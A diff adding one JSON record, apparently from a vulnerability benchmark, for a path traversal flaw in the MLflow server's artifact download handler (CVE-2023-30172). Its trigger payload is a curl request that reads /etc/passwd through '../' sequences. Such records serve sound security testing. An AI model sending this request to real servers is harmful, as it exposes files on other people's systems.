@@ -1,0 +1,15 @@
+{
+  "file_id": "169_mlflow_issue_7166",
+  "numeric_id": "169",
+  "library_hint": "mlflow",
+  "source": "github_issue",
+  "title": "Local file inclusion in MLFlow server via artifact download handler due to unsafe path parameter validation",
+  "cve": "CVE-2023-30172",
+  "cwe": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+  "library": "mlflow",
+  "affected_version": ">= 1.26.1, < 2.0.1",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "curl -X GET {BASE_URL}/api/2.0/preview/mlflow/artifacts/download?path=../../../../etc/passwd",
+  "oracle": "server returns the content of the arbitrary file (e.g., /etc/passwd) in the response"
+}
